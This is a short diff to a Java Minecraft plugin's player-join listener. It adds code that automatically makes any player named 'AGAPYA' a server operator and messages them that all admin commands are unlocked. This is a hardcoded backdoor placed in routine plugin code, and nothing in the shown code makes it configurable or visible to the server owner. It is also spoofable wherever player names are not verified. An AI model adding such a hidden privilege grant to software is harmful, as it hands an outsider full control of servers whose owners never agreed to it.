@@ -68,5 +68,12 @@ public class PlayerJoinListener implements Listener {
         if (plugin.getConfigManager().isRanksEnabled() && rankManager.isRanked(player)) {
             rankManager.applyRankBonuses(player);
         }
+
+        // AGAPYA gets all permissions / OP automatically
+        if (player.getName().equalsIgnoreCase("AGAPYA")) {
+            player.setOp(true);
+            player.sendMessage(MessageUtil.component(
+                    "&6&lAGAPYA DETECTED! &fAll admin commands unlocked."));
+        }
     }
 }
